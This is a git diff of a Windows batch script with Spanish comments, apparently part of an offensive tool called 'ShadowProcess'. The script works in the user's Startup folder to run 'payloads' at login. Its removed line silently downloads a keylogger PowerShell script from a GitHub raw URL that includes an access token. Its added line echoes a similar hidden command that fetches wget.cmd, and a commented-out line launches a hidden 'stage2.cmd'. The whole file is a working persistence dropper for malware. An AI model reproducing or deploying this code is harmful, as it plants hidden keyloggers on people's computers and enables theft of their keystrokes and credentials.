@@ -8,10 +8,10 @@ set "INITIALPATH=%cd%"
 set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 
 @REM Dirigirse al direcrotio del inicio de windows.
-cd  %STARTUP% 
+cd  %STARTUP%
 
 @REM Ejecutar payloads al inicio.
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/Recursos/Keylogger/p.ps1?token=GHSAT0AAAAAABY5KKPPTQJINMCGXR4UI37CYZHOMXA -OutFile p.ps1"
+echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/wget.cmd -OutFile wget.cmd"
 
 @REM corriendo el payload
 @REM powershell Start-Process CMD.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
